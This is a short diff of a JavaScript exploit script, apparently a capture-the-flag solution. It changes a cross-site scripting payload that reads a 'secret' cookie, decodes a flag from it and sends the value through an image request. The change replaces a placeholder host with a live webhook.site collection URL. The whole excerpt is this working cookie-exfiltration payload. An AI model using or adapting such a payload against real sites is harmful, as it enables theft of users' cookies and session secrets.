@@ -32,7 +32,7 @@ document.getElementById('clickme').onclick = function() {
     (function() {
       const secret = document.cookie.split('secret=')[1]?.split(';')[0];
       const flag = atob(secret || '').split(':')[1] || '';
-      new Image().src = 'https://YOUR-WEBHOOK.url/?' + encodeURIComponent(flag);
+      new Image().src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a/?' + encodeURIComponent(flag);
     })()
   `.replace(/\n/g, ' ');
 
